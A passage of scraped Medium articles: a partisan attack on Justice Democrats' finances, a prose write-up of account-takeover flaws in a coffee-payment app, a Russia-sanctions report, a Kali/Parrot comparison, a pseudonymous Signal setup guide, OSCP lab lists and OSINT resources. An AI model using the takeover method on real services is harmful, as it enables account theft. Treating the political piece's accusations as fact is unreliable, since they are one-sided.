The national spotlight may be great for fundraising efforts, but may prove unwise for a group of political novices inexperienced in federal finance regulations. An analysis of FEC filings shows that their network of PACs, LLCs, board and staff navigate in the same legal and ethical grey area their entire “anti-dark money” platform is based on combatting.
Beginning with Justice Democrats, the PAC has raised $2,100,399 over the course of the 2017–2018 election season. Yet over that same time period, the PAC has made zero independent expenditures in support of any candidates. In fact, dozens of candidates have instead made payments to Justice Democrats.
A review of disbursements reveals that of the $2,026,298 spent to date, over $600,000 for “strategic consulting” services was directed to Brand New Congress LLC — a business entity controlled by Chakrabarti. Another $1 million in contributions has been directed to ex-Bernie staffers or their firms. This includes $222,000 to Middle Seat Consulting LLC, run by Brand New Congress co-Founder Zack Exley, and about $800,000 in salaries and payroll costs. Because those LLCs have not disclosed financial reports, the public has no way of knowing what that money was used for.
In-kind contributions directed towards PAC-endorsed candidates were found to total less than $29,000 for services like Facebook ads, phone banks, operating costs, and communications software. Yet at the same time, about $35,000 was paid to Justice Democrats by these candidates and registered as either “other receipts: operating costs” or “offsets to operating expenses: reimbursement of operating costs.”
Due to this lack of independent expenditures to candidates, the FEC rejected the PACs filing for Multi-Candidate Status at the end of 2017. In its letter, the FEC alleged Justice Democrats had erroneously claimed contributions to five candidates in Texas.
A review of Brand New Congress PAC filings demonstrate a similar movement of fundraising donations into the pockets of ex-Bernie “consultants”. Of the $477,688 raised, no independent expenditures to candidates were made, yet $261,000 was paid to Brand New Congress LLC and over $100,000 was disbursed as salaries or payroll costs.
Ocasio-Cortez’ campaign committee filings show disbursements to Brand New Congress LLC and Justice Democrats, alongside other serious issues. On July 19th, the FEC sent a letter to Ocasio-Cortez’ campaign committee treasurer outlining multiple accounting inaccuracies and requesting “information essential to full public disclosure of your federal election campaign finances.” The FEC has requested response by August 23rd and is considering “audit or enforcement action.”
What’s the bottom line?
The entire premise of the Justice Democrats and Brand New Congress anti-establishment platform is a drive to remove corporate, lobbyist, and dark money from politics. The PACs blame the “corporate wing” for “breaking” the Democratic Party. Every candidate is asked to take a “No Corporate PAC Pledge.” But this conveniently obfuscates another problem related to money in politics — scam PACs that use fundraising as a vehicle for personal profiteering.
Open Secrets, a non-profit organization that tracks money in politics, recently wrote about the incidence of scam PACs that claim to raise money for political campaigns but spend little to none of the proceeds to that end:
“A scam PAC would be a political committee that raises funds with the purpose of supporting candidates or a particular cause, but then instead of spending the money raised to support candidates or causes, the political operatives running the PAC pay themselves,” Brendan Fischer of Campaign Legal Center said.
The parties profiting from Justice Democrats and Brand New Congress are not naive to the perception issues their use of funds has created. For this reason they’ve sought to clarify, in increasingly convoluted ways, the tangled financial structures and relationships between the PACs, LLCs, board, and staff. Their explanation can be generally summarized as this: the groups structured themselves as a PAC in order to fundraise, but with the intention to operate as a campaign vendor to avoid working with the DCCC.
“By creating a scalable infrastructure that candidates can use to run their campaigns, we are able to start creating a party-like infrastructure that not only endorses and fundraises for candidates, but also provides them with the tools and people necessary to run a successful campaign.”
Which begs the question — if the goal is to create a “party-like infrastructure”, what is the purpose of running as Democrats in the first place? It appears access to voter data is the primary motivator.
Ocasio-Cortez has talked a big game about her “upset” victory over Joe Crowley, a ten-term congressman on the short list to become next Speaker of the House. In reality, she capitalized on an extremely low primary turnout to eek out a 57% vs. 43% (15,897 vs. 11,761) victory. And while it is true that the young candidate deployed an impressive grassroots canvassing strategy, the devil is in the details— including dirty local politics, vitriolic campaign rhetoric, far left agitators, and an intensive Facebook advertising blitz in the lead up to the primary.
Part of the local controversy revolved around the involvement of disgraced ex-Queens politician Hiram Monserrate. A domestic abuser who spent time in prison on a corruption conviction, Monserrate has feuded with Crowley for years. During their contentious primary, Crowley accused Ocasio-Cortez of seeking support from the ex-con, even speaking at an event held at a Democrat Club he runs in Queens.
In her trademark racial identity politics offensive against Crowley, Ocasio-Cortez denied the accusation, saying she had sought the support of the club “not Hiram Monserrate” and “was at the only Latino Democratic Club in East Elmhurst and Corona. That’s where I was.” Yet after Ocasio-Cortez secured the nomination, Monserrate told the New York Post “there were a group of us, in the (club) and other community activists I have been working with for years who understood that we would do our part to get rid of Joe Crowley…We were in support of Alexandria’s campaign.”
The sentiment to “get rid” of Joe Crowley was not just a local one, as far left agitators from across the country rallied online in support of Ocasio-Cortez. In fact, the vast majority of Ocasio-Cortez campaign donations have come from out-of-district and out-of-state. Of particular note is Blue America PAC, a “collaboration between the authors/publishers of DownWithTyranny.com, Hullabaloo.com and CrooksandLiars.com.” The PAC made an $11,000 independent expenditure in opposition to Joe Crowley, creating the website QueensAgainstCrowley.com.
While Ocasio-Cortez may claim this was an independent or unendorsed endeavor, her NYC Campaign Finance Board profile lists Blue America as an affiliated organization. The meme-heavy social media pages for the PACs various websites pushed out vitriolic blog and social media posts during the primary, using budget graphics with British-English copy to promote hashtags like #AbolishICE #Berniewouldhavewon and #MobBossCrowley. It could not be determined how much of this content was promoted through Facebook advertising to target specific demographics living in the 14th district.
And there is still the mystery of what exactly happened in the 15th district. As previously described, Ocasio-Cortez submitted her first Statement of Candidacy to run in the 15th. She was “shocked” to learn that two weeks after the New York primary, she had won the district as a “write-in candidate on the Reform line.”
Since the Democratic incumbent in the 15th faced no challenger, there is a legitimate question as to whether voters in that district were canvassed and/or targeted online as a backup strategy to losing the 14th. As it was, Crowley was confronted with what he described as “Trump-esque” accusations of election rigging in the lead up to and day of the primary.
It is a question Alexandria Ocasio-Cortez posed on Twitter in the month before the primary. It’s also a hauntingly familiar sentiment that echoes the hostile, anti-Democrat rhetoric that defined Sanders’ 2016 primary campaign. In a February indictment of Russia’s Internet Research Agency, the public learned in stark detail how the “Bernie or Bust” message was weaponized to divide Democrats and suppress voter turnout.
It’s a reality that Ocasio-Cortez and some Justice Democrat candidates seem intent on distorting. For instance, a supposedly “progressive” candidate for Governor in Michigan said in a recent interview:
“Bernie Sanders won his primary in Michigan. Then Hillary Clinton lost the general. All that shows is that our voters are interested in progressives and are done with the centrist moderate Democrat.”
This “Bernie would have won” revisionism has a toxic impact on voter’s understanding of what happened in 2016. It ignores the fact that Hillary Clinton beat Donald Trump by three million votes nationally. And it ignores the impact foreign cyber attackers had by using stolen Facebook data and agitating content to target individuals in specific states.
In 2018, there is no legitimate claim of ignorance for how foreign information warfare attacks Americans online. Millions of fake social media accounts amplify the extremes on both sides of the political spectrum to cause disruption and chaos. The goal is not to favor one party over another — it’s to topple our very democracy. Knowingly providing the type of propaganda fodder that foreign attackers can weaponize is negligent and destructive.
Yet much of Ocasio-Cortez’ divisive rhetoric appears to be doing exactly that. For anyone engaging with Ocasio-Cortez’ social media posts, the foreign bot and troll activity is noticeably synchronized and pervasive. There’s no better example than the #AbolishICE campaign she championed as her number one primary issue and has helped take national. Much of her social media content has focused on the “Abolish ICE solution” to immigration reform while accusing “Boss Crowley” and other Democrats of being “Pro-ICE”. In the one month lead up to the June primary, Ocasio-Cortez’ campaign spent over $80,000 on Facebook advertising — the largest of her expenditures.
Just last week, Mark Zuckerberg gave a private briefing to lawmakers on how Russian cyber attackers where exploiting the #AbolishICE campaign:
“Facebook said on Tuesday that it had identified a political influence campaign that was potentially built to disrupt the midterm elections, with the company detecting and removing 32 pages and fake accounts that had engaged in activity around divisive social issues.”
Ocasio-Cortez and the Justice Democrats believe “the solution is not unity.” Over the past month, national media has helped push their radicalized agenda into our mainstream discourse, hijacking what it means to be “progressive”. The days of reforming ICE are now #AbolishICE. The policy of public option healthcare is now #MedicareForAll. The true progressive platform of the Democratic Party is provided little exposure while critics from both the left and right amplify the message that the Democrats “have no message.”
With our media repeating these sins of 2016, and the Trump administration complicit in Russia’s cyber offensive, Americans must become more aware of the distraction and distortion tactics being waged against us. It’s not policy that’s on the ballot this November, it’s democracy itself.
Written by
","['Politics', 'Election 2018', 'Cybersecurity', 'Democrats', 'Fake News']"
Nothing is safe in a hacker conference: not even the coffee machine,https://medium.com/@fs0c131y/nothing-is-safe-in-a-hacker-conference-not-even-the-coffee-machine-8501bf14f41a?source=tag_archive---------7-----------------------,"The 6th of July 2019 “LeHack”, one of the oldest French underground hackers’ event took place in The Cité des Sciences et de l’Industrie, in Paris. The morning was super cool, I had the chance to meet and chat with a lot of people. After the meal, I started to feel tired so I decided to have a coffee and that’s where this story begins.
This coffee machine is quite standard, so I paid my coffee with my credit card and I was ready to leave when I saw that.
It’s written “Pay with your smartphone! Download the Coffee cApp”. Wait, what? I can pay my coffee with an Android app! I’m a hacker at a hacker conference with plenty of time. It’s time to do my thing.
I downloaded this <sarcasm>very useful</sarcasm> app and started to use it. Spoiler: The next 2 hours were pretty productive.
First I created an account. Interesting, in the response I received an UserId.
After that, I reset the password of my account. In the POST request, we have a parameter called “Password” which is your current password, a parameter called “ConfirmPassword” which is your new password and wait?! What?! a parameter called “UserUId”. The value of this “UserUId” parameter is equal to the value of “UserId” in the account creation response. What is happening if I replace my UserUId with the UserUId of someone else? Let’s try!
To verify if I can reset the password of another account I created a second account. I reset the password of this second account and in the POST request to the endpoint /User/ResetPassword I replaced the UserUId value by the UserUId of my first account. Bingo, it’s working! The password of the 1st account has been reset!
Ok Elliot, that’s cool but to takeover the account you need to have the UserUId of the victim.
In the first request made during the reset process, the app sends your username, which is equal to your phone number, to their server. If this username exists, you will get a 200 response code.
If you send a random username, the server is telling you “UserNotExists”.
I sent everything to the Intruder in Burp Suite and damn! There is no rate limit, you can brute force all the valid usernames and so enumerate all the accounts. By chaining the 2 vulnerabilities we can now takeover all the accounts of the apps.
Last but not least, I found another vulnerability in the app. When you create an account, they send you a pin to validate your account.
This is the request sent by the app to validate the pin entered by the user. Did I told you there is no rate limit on the server? As a consequence, you can brute force the valid pin.
Ffs, you don’t need to connect everything, an app for your coffee machine is useless.
Written by
","['Security', 'Android', 'Hacking', 'Cybersecurity']"
Obama Hits Russia With Sanctions — And More — Over Cyber Attacks,https://medium.com/war-is-boring/obama-hits-russia-with-sanctions-and-more-over-cyber-attacks-7882d74067a6?source=tag_archive---------6-----------------------,"by ROBERT BECKHUSEN & JOSEPH TREVITHICK
In the lead up to and after the 2016 presidential election, the United States made a series of escalating allegations about Russian cyber attacks against government agencies and private groups. On Dec. 29, 2016, these accusations came to a head with a flurry of American sanctions, expulsions of Kremlin officials and a joint report from the Department of Homeland Security and Federal Bureau of Investigation.
“These actions follow repeated private and public warnings that we have issued to the Russian government, and are a necessary and appropriate response to efforts to harm U.S. interests in violation of established international norms of behavior,” Pres. Barack Obama said in a statement.
“All Americans should be alarmed by Russia’s actions.”
President-elect Donald Trump — who at times in the campaign seemed to be the Kremlin’s preferred candidate — seemed less convinced. “It’s time to move on to bigger and better things,” he said in a statement.
“Nevertheless, in the interests of our country and its great people, I will meet with leaders of the intelligence community next week in order to be updated on the facts of the situation.”
The facts as the public quickly understood them, both in terms of the U.S. allegations and response, were significant.
On Dec. 29, 2016, in what may be one of his last such actions, Obama amended a 2015 executive order that already gave the U.S. government new authority to respond to “malicious cyber activity.” With the change, the president can sanction foreign agents who try to interfere with the country’s election processes.
But Obama’s actions were not limited individuals or groups involved in attacks during the 2016 campaign. He quickly sanctioned Russia’s main internal and military intelligence agencies, commonly known by the acronyms FSB and GRU respectively, for leading the breaches.
“This activity by Russian intelligence services is part of a decade-long campaign of cyber-enabled operations directed at the U.S. Government and its citizens,” DHS, FBI and Office of the Director of National Intelligence said in a statement. “The U.S. government can confirm that the Russian government, including Russia’s civilian and military intelligence services, conducted many of the activities generally described by a number of these security companies.”
With help from these private firms, the U.S. government linked the Russian agencies to various attacks. The joint DHS and FBI report compiled a list of nearly 50 different hacking “campaigns.”
“The U.S. government is referring to this malicious cyber activity … as Grizzly Steppe,” the summary review states early on. “Previous [joint analysis reports] have not attributed malicious cyber activity to specific countries or threat actors.”
“However, public attribution of these activities to [Russian civilian and military intelligence Services] is supported by technical indicators from the U.S. Intelligence Community, DHS, FBI, the private sector and other entities.”
In addition, four specific GRU agents and three private companies the U.S. believed aided the hacking ended up on the sanctions list. The U.S. Treasury Department hit two more Russian nationals with financial and travel restrictions under a separate executive order.
On top of all that, the U.S. State Department ordered 35 of Moscow’s diplomats working in offices in Washington, D.C. and San Francisco, California to leave the country within three days. State added that it would close off all access to Russian-occupied facilities in Pioneer Point, Maryland and Oyster Bay, New York by mid-day on Dec. 30, 2016.
The Soviet Union had originally purchased these properties. Just hours after the announcement, American authorities had arrived at the site on Long Island to oversee the closure.
“The Department took these actions as part of a comprehensive response to Russia’s interference in the U.S. election and to a pattern of harassment of our diplomats overseas that has increased over the last four years,” Deputy State Department spokesperson Mark Toner said in a statement.
“The Russian Government has impeded our diplomatic operations by, among other actions: forcing the closure of 28 American corners which hosted cultural programs and English-language teaching; blocking our efforts to begin the construction of a new, safer facility for our Consulate General in St. Petersburg; and rejecting requests to improve perimeter security at the current, outdated facility in St. Petersburg.”
In a conference call on Dec. 29, 2016, White House officials added that Obama was still considering more actions in response to Russia’s activities. These could include measures not announced to the public, possibly a reference to retaliatory cyber attacks.
Regardless, as Obama and Toner implied in their comments, Russia knew very well that America’s response was coming from months of both public and private discussions.
“The outgoing U.S. administration has not given up on its hope of dealing one last blow to relations with Russia, which it has already destroyed,” Russian Foreign Ministry spokesperson Maria Zakharova said in a statement on Dec. 28, 2016. “Using obviously inspired leaks in the U.S. media, it is trying to threaten us again with expansion of anti-Russian sanctions, ‘diplomatic’ measures and even subversion of our computer systems.”
Already under pressure from the media, privacy groups and legislators to provide evidence of its assertions, and perhaps sensing a need to get ahead of Russia’s response and Trump’s impending inauguration, the Obama administration apparently decided it could not wait any longer. DHS even set up a website dedicated to the Grizzly Steppe investigation, implying more information may be forthcoming.
In addition to the names of “campaigns” associated with the Russian government, the initial joint report from DHS and FBI offered new, if still limited specifics about how the U.S. government believed the attacks proceeded, the electronic clues cyber attackers left behind.
The DHS and FBI specifically say their analysis built on an earlier statement Homeland and the Office of the Director of National Intelligence released together in October 2016. Without providing many granular details, that press release stated the U.S. Intelligence Community — 16 different groups in all — was “confident” the Russian government was responsible for a series of breaches.
In spite of this joint statement, the FBI and the Central Intelligence Agency reportedly disagreed on the exact reason for the intrusions. The new joint report did not spell out any motivations.
The authors appear to have aimed the bulk of the information primarily at network administrators of organizations which could be targeted by Russian hackers, including universities, political organizations and think tanks. It provided basic examples of how the exploits worked and explained what I.T. professionals could and should do to check their networks immediately.
If you think this is just about the Democratic Party — you’re wrong. Russian influence operations are ideologically diffuse, and reach across the political spectrum from left to right. Russian kompromat tricks have also targeted individual human rights activists and Russian dissidents living in Western countries.
If that isn’t bad enough, it’s plausible to expect these attacks to grow more sophisticated — as they already have — and become the purview of a wider variety of actors both domestic and international. Chances are, if you’re reading this, you’re more likely to become a target of organized crime than a foreign state.
Yet the steady revelations of extensive state-sponsored hacking should also serve as a reminder that there are no foolproof ways to stop from being hacked, though there are ways to make it more difficult.
Fortunately, the joint report includes tips which are applicable to everyday users.
But remember to read Brian Krebs’ security rules and pay attention to his warning that protection means cocooning your digital world in layers.
It also doesn’t have to be complicated. Make sure you have a good anti-virus system and put its settings as high as they’ll go. If you can afford to buy an annual subscription for extra security, do it.
Use long, complicated and unique passwords — and change them frequently and lock them in a password safe. Require two-factor authentication wherever possible.
In most cases, state-sponsored hackers — like hackers everywhere — access systems by betting on computer users’ laziness. Clinton campaign chief John Podesta fell for a simple phishing email.
So here’s a reminder to never click on a link you don’t trust and never download an unfamiliar attachment. Really, before technological safeguards even come into it, most victims become that way by making stupid mistakes.
Lock yourself down — and be afraid.
Written by
","['Air', 'Land', 'Sea', 'History', 'Culture', 'Politics', 'Store', 'Wib Politics', 'Russia', 'Cybersecurity']"
Operating System for Penetration Testing in a Nutshell; Kali Linux vs Parrot Security OS,https://medium.com/hackernoon/operating-system-for-penetration-testing-in-a-nutshell-kali-linux-vs-parrot-security-os-384809e7b7ae?source=tag_archive---------0-----------------------,"If you are a hacker, penetration tester, bug bounty hunter, or a security researcher, then it's likely that you must have already heard about various Linux distributions which are flexible for your workflow.
I’ve used both the operating system quite often for my research work and pen testing work. linux has a heterogeneous collection of distributions which are available in the market. but the most famous distribution used by most of the security researchers and penetration testers is Kali Linux. Kali has gone through various iterations in the form of updates while another penetration testing cybersecurity-related distributions were also being developed around the world, In this article, we will compare Kali to one such distribution that has come under the spotlight, i.e. ParrotOS. this comparison explains the various pros and cons of both operating systems.
Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing. Kali contains more than 600 hundred pre-installed tools which are geared towards various information security tasks, such as Penetration Testing, Security research, Computer Forensics, Web Application testing, and Reverse Engineering. Kali Linux is developed and maintained by Offensive Security, a leading information security training company. It was developed as a refined pen-testing distro that would be served as a replacement for backtrackOS. It was released on the 13th March 2013 as a complete, top-to-bottom rebuild of BackTrack Linux, adhering completely to Debian development standards.
More than 600 penetration testing tools included — It comes with various penetration testing tools from the installation itself, After reviewing every tool that was included in BackTrack, It eliminated a great number of tools that either simply did not work or which duplicated other tools that provided the same or similar functionality.
Multi-language support — Although penetration tools tend to be written in English, to improve the usage of the non-native English users Kali includes true multilingual support, allowing more users to operate in their native language and locate the tools they need for the job.
Completely customizable — The initial design of the Kali Linux is not up to the mark because the look and feel are not so good, to avoid that problem Kali has made it as easy as possible for our more adventurous users to customize Kali Linux to their liking, all the way down to the kernel.
Wide-ranging wireless device support — A regular sticking point with Linux distributions has been supported for wireless interfaces. Kali Linux supports as many wireless devices as possibly can, allowing it to run properly on a wide variety of hardware and making it compatible with numerous USB and other wireless devices.
Custom kernel, patched for injection — As penetration testers, we often need to do wireless assessments and testing, so our kernel has the latest injection patches.
Free — Kali Linux, it is free to use like BackTrack, we will never, need to pay for Kali Linux.
Parrot Linux (Parrot Security, parrot OS, Parrot GNU/Linux) is a free and open source GNU/Linux distribution based on Debian Testing designed for security experts, developers, and privacy aware people. When I say Debian based, it means that the code repositories adhere to Debian development standards. It includes a full portable arsenal for IT security and digital forensics operations, but it also includes everything you need to develop your own programs or protect your privacy while surfing the net. The operating system ships with the MATE desktop environment preinstalled and is available in several flavors to fit your needs.
Parrot OS was first released in 2013 and was developed by a team of security experts, Linux enthusiasts, and open source developers. The team was headed by Lorenzo Faletra.
Secure — It is always updated, frequently released and fully sandboxed! Everything is under our complete control.
Free — It is free and open-source, we can view source code and customize it as per our requirements.
Lightweight — This Operating system has proven to be extremely lightweight and run surprisingly fast even on very old hardware or with very limited resources.
These both operating systems are meant for the same purpose i.e cybersecurity and penetration testing. Most of the factors in such cases boils down to a matter of personal taste rather than an objective comparison. Now, before we start comparing ParrotOS vs Kali Linux, let me list out the similarities between the two operating systems.
Now, let’s discuss various differences between both operating systems
Parrot OS —
Hardware requirement is something which we ignore most of the time, primarily because we know that our systems are much more powerful than the minimum hardware requirements computers. but Parrot needs lower specification hardware when compared to Kali, meaning it can be run on low powered laptops and machines.
This is one of the reasons why I prefer Parrot sec over Kali Linux, but I like and use both of them as I said Its never about which operating system or tool you are using, it all depends on your skills.
When it comes to look and feel of an operating system I mostly prefer parrot os over Kali Linux because —
The interface of Parrot OS is built using the Ubuntu-Matte-Desktop-Environment. There are two clear sections. On top, you see a pane which contains the Applications, Places, System which is much like Kali itself. Parrot OS also gives some cool information about CPU temperature along with a usage graph. The bottom pane contains the menu manager and the workstation manager.
On the other hand, Kali Linux follows the GNOME desktop interface. In my opinion, it has the same functionality as parrot os but doesn’t provide the same clean, refined look.
When it comes to general tools and functional features, Parrot OS wins over Kali Linux. Parrot OS has all the tools that are available in Kali Linux and also adds its own tools. There are several tools you will find on ParrotOS that is not found on Kali Linux. Let’s discuss a few such tools —
Being anonymous for a hacker is the first step before hacking a system.
You already have heard the line, every hacker changes his night at midnight.I don’t want to go too much into it, but parrot has Anonsurf preinstalled and configured, so if you are doing something stealthy and want to be anonymous, you can cloak yourself with just one click.
It is a rogue Access Point framework used for conducting Wi-Fi security testing. Using Wifiphisher, penetration testers can easily achieve a man-in-the-middle position against wireless clients by performing targeted Wi-Fi association attacks. Wifiphisher can be further used to mount victim-customized web phishing attacks against the connected clients in order to capture credentials or infect the victim stations with malware.
Both operating systems come with a variety of variations, but Parrot OS has much more in terms of variety.
Kali Linux —
Parrot OS —
As we see, Parrot has some diverse features with a release focussed on wireless penetration testing (AIR) and one that is tuned for multimedia content creation(studio). Other than that, it also has releases that have cloud support and support for IoT devices. Kali gives the basic full and lite edition along with custom desktop interfaces(e17/KDE/Matter/LXDE). Kali also has support for cloud and IoT devices.
when we talk about performance, Kali is a bit laggy and when you run it on a low-end system, sometimes it's a nightmare when you have a brute-force attack going on in the background and you doing something else. But Parrot it is very lightweight and doesn't lag much. because it runs on low specification systems as well.
I hope you got a clear idea about the Parrot security OS and Kali Linux. I discussed pretty much everything about both the operating systems in a detailed manner. But selecting an operating system is based on your taste and choice, if you have a low specification system I would highly recommend to go with Parrot Sec OS. other than that go with whatever you want.
Most of the people argue that Parrot has more tools than Kali Linux and in Parrot Os, we can set up Anonymous Surf easily. but what I believe and say is Penetration testing is not about Setting up the tools it’s all about identifying the defects in a system.
Hope this helps you learn about various differences between Kali Linux and Parrot for penetration testing.
If you liked this article please click on the clap and leave me your valuable feedback.
Written by
","['About', 'Help', 'Go Home', 'Linux', 'Cybersecurity', 'Hacking', 'Testing', 'Penetration Testing']"
Operational Signal - Just another infosec blog type of thing,https://blog.0day.rocks/operational-signal-d41d2c457d8d?source=tag_archive---------6-----------------------,"A lot of people are asking me about secure messaging and how to properly use such tools. Every secure messaging application is different and will offer different solutions to counter different threats. You need to know your own personalized threat model before choosing the right tool. Ask yourself who are you protecting against?
First of all, Signal is an encrypted instant messaging solution. It is not intended to anonymize you or to hide with whom you are communicating. Signal uses a centralized communication scheme with end-to-end encrypted messages. This means your messages (upon having verified the safety numbers) will only be intelligible by you and your remote recipient.
The Signal core protocol is one of the best encryption protocol there is to protect confidentiality (with by default forward secrecy and strong cryptographic algorithms). But encryption doesn’t mean Open Whisper Systems or SIGINT-capable actors can’t identify with whom you’re talking to.
And it’s not about trusting Open Whisper Systems or not, because 1) you should not trust any central authority and 2) their servers could easily be compromised by some third party. Signal being used by a lot of “persons of interest” it represents a very interesting target for any three-letter agency or nation-state hackers. It is also worth noting that the centralized servers (that seems to be hosted on AWS) are running closed source code — though it does not impact confidentiality of the messages they could be exploited to monitor relationship and activity between targets.
You can use Signal as an overt secure messaging platform on your own phone, or as a covert system to communicate. I’ll review the second option as the first one is obviously easy to set up (given some security guidelines).
One often mentioned issue with Signal is the need of a valid phone number. It really depends on your threat model. Is it really an issue? If yes, then you should consider using some other tools that don’t require a phone number (XMPP w/ OTR, Ricochet, …). Nonetheless, there are some ways to set up a clean account, thanks to virtual phone numbers.
First step would be to set up a “clean” environment with your own “opsec” methods. For newbies I would recommend Tails or Subgraph. Tor is of course highly recommended if you wish to remain anonymous, even if I prefer the term “pseudonymous” as you’ll be identified with a unique phone number after all.
There are numerous virtual phone number providers accepting bitcoins so you can get yourself a new phone number. I won’t get into the details as it is pretty much straightforward. Use Tor. Use Bitcoin. And get yourself a clean number.
Install the excellent signal-cli tool from Github and register your new number with it, it can be done in two easy commands:
⚠️ ️Beware as Java (used by signal-cli) is not working very well with torify or proxychains, so I would recommend setting up a transparent proxy if you want to use Tor with it.
Next step, install Signal Desktop (yes, it comes as a Chrome app). Before proceeding any further you should make sure that all Chrome/Chromium connections are going through Tor using your global proxy settings or via a transparent proxy.Upon opening for the first time the Signal application it should ask you to scan a QR code. This QR code is used by Signal to pair with your existing mobile device, that is in fact our signal-cli client in this context.Simply translate this QR code to raw text using your favorite QR code scanner, it should translate to something like this: tsdevice:/?uuid=cAg4kd…&pub_key=LpRhjdD2D…
Now pair your desktop app with the addDevice option:
You should see the Signal Desktop app ask you for a new device name and there you go! You now can enjoy using Signal pseudonymously �
Please feel free to share and comment. Anything to suggest? Reach out to me via Twitter or Signal at +17752386572 �
Written by
","['Privacy', 'Security', 'Cybersecurity', 'Encryption', 'Instant Messaging']"
OSCP Training VM’s hosted on Vulnhub.com - Andrew Hilton - Medium,https://medium.com/@andr3w_hilton/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1?source=tag_archive---------3-----------------------,"*****UPDATE****I have been spending a lot of time recently over on HTB, I have written a companion post to this one listing the boxes over no HTB that you can use to practice for your OSCP exam. If you prefer their lab environment instead of Vulnhub VM’s.
You can read that post HERE.
Thanks to Holocircuit for this little tip. We were speaking about the OSCP exam and lab time and I was asking him about some VM’s that could be used for practice before I paid for official OffSec Lab time.
He very kindly pointed me in the direction of the #VulnHub channel on Freenode where you can run a command and pull off a list of the OSCP “Themed” VM’s that are hosted on there. It was a bit if a pain signing up and joining the channel. But I would highly recommend you do it as the knowledge in the forum is amazing.
Anyway I decided to post this quick post listing the 11 VM’s.
(#1) Kioptrix: 2014 https://www.vulnhub.com/entry/kioptrix-2014-5,62/(#2) FristiLeaks: 1.3 https://www.vulnhub.com/entry/fristileaks-13,133/(#3) Stapler: 1 https://www.vulnhub.com/entry/stapler-1,150/(#4) VulnOS: 2 https://www.vulnhub.com/entry/vulnos-2,147/(#5) SickOs: 1.2 https://www.vulnhub.com/entry/sickos-12,144/(#6) Brainpan: 1 ttps://www.vulnhub.com/entry/brainpan-1,51/ ←(THIS ONE IS GREAT FOR BoF PRACTICE)(#7) HackLAB: Vulnix https://www.vulnhub.com/entry/hacklab-vulnix,48/(#8) /dev/random: scream https://www.vulnhub.com/entry/devrandom-scream,47/ (#9) pWnOS: 2.0 https://www.vulnhub.com/entry/pwnos-20-pre-release,34/(#10) SkyTower: 1 https://www.vulnhub.com/entry/skytower-1,96/(#11) By special request from dud3z DC416 CTF “Basement” https://www.vulnhub.com/series/dc416,99/
*****************************************************************UPDATED 15.07.19 with Vulnhub boxes added from other sources
Kioptrix: Level 1 https://www.vulnhub.com/entry/kioptrix-level-1-1,22/Kioptrix: Level 1.1 https://www.vulnhub.com/entry/kioptrix-level-11-2,23/Kioptrix: Level 1.2 https://www.vulnhub.com/entry/kioptrix-level-12-3,24/Kioptrix: Level 1.3 https://www.vulnhub.com/entry/kioptrix-level-13-4,25/PwnLab: init https://www.vulnhub.com/entry/pwnlab-init,158/Mr Robot https://www.vulnhub.com/entry/mr-robot-1,151/HackLab: Vulnix https://www.vulnhub.com/entry/hacklab-vulnix,48/IMF https://www.vulnhub.com/entry/imf-1,162/
NOT VULNHUB BUT GREAT FOR BoF PRACTICEhttps://github.com/justinsteven/dostackbufferoverflowgoodhttps://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/https://www.tenouk.com/Bufferoverflowc/Bufferoverflow1.htmlhttps://raw.githubusercontent.com/m0nad/Papers/master/buffer_overflow_iniciantes.txt
*****************************************************************
If like me you’re looking to book the OSCP exam and some Lab time, check these VM’s out first and get a VERY small flavour of what to expect.
Hope this is helpful.
Written by
","['Oscp', 'Hacking', 'Cybersecurity', 'Vulnerability', 'Pentesting']"
OSINT Resources for 2019 - Steve Micallef - Medium,https://medium.com/@micallst/osint-resources-for-2019-b15d55187c3f?source=tag_archive---------1-----------------------,"Whether you are new to OSINT (Open Source Intelligence) or use it regularly in your professional life for reconnaissance, threat intelligence or investigations, the recent speed of growth in the field means constant development in terms of tooling, data, content and community. In this post I aim to highlight some essentials that everyone relying on OSINT should know, plus newer resources that might provide additional insights.
If you are new to OSINT or come from a less technical background, there are some foundational resources you should gain a solid grasp of first because they’ll really help you get better use out of the other tools mentioned later in this post, in addition to gaining a deeper understanding the data they present:
With these essentials covered, you are ready to stand on the shoulders of giants by utilising more sophisticated tools and platforms others have created, many of which build upon the basics above but at a much larger scale.
The great thing about Internet Scanners is that when you want to find out what services your target has exposed (open ports, protocols, applications, content), they do most of the heavy lifting for you so you just need to query their database instead of performing port scans yourself. The other major benefit: it’s completely passive so your target won’t know anything about your search.
Passive DNS services tap into Internet DNS traffic to build up a history of DNS resolutions. We know that with DNS we can resolve a name to an IP, or an IP to a name. But what if we want to find all the names that resolve to a given IP? Or see what IPs a name has historically resolved to? Passive DNS solves this problem. No single service will ever have a complete picture and the freshness of data will vary, so it’s often best to query multiple Passive DNS services to get the most comprehensive result.
If one of your main goals with OSINT is threat intelligence, you’re in luck because the number and quality of sources is huge, so I’ve cheated a bit here and listed my two favourites plus a link to a service which aggregates all of them and compares their originality for you.
Reverse Whois is one of my favorite OSINT resources because it’s so powerful and often yields surprising (and funny) results. While regular Whois only provides searching by the domain name, Reverse Whois resources enable you to search current and historic Whois records by fields such as name, phone number and email address. More concretely, if abc@xyz.com is the contact for the domain you’re investigating, you can find all the other domains registered under that e-mail address. This is incredibly useful for when attempting to identify shadow IT issues or discovering the full perimeter of your target beyond the primary domain name(s).
With the ever increasing number of OSINT data sources you will eventually need some automation so that you’re not spending all your time switching between browser windows, copying and pasting and increasing the chance of human error. Tools will enable you collect, structure, correlate and visualise OSINT data and even monitor for changes over time.
There are a growing number of tools entering the OSINT arena, covering sub-domain enumeration, social media correlation and so on. Sometimes a general broad-coverage tool is good to give you access to a lot of data points at once, and other times you want a very narrow and specific tool for just one data point. One critical theme however is freshness — try and use tools that are actively maintained so that you can be confident they are using the latest APIs of the data sources they integrate with.
One of the best things to happen in the OSINT space over the past couple of years is the growth in the community. Blog posts, chat groups, aggregated resource lists and even Podcasts are now available:
As is typical with any post of this nature, I’ve really just scratched the surface of OSINT resources available today. Nonetheless I hope you found it useful and in future posts I’ll cover some other aspects of the growing world of OSINT. If you want to see some of the resources above (and others) in action you can check out my previous post about analysing a Bitcoin scam.
Written by
